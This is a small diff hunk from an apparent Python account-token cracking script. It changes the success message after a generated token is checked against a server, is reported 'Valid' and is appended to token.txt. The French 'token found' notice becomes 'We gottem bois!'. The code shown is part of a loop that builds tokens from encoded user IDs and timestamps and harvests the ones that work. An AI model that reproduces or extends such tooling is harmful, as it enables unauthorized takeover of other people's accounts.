@@ -56,7 +56,7 @@ def gen(encodedid, encodedstamp):
     r = req.get(url, headers=headers)
     if r.status_code == 200:
         print(f'{Fore.WHITE}{token} {Fore.BLACK}: {Fore.GREEN}Valid')
-        notifyMe("Token trouver", f"Le token de {user} viens d'être trouvé Bravo !")
+        notifyMe("Got token!", f"We gottem bois!")
         f = open("token.txt", "a")
         f.write(token)
         f.close() 
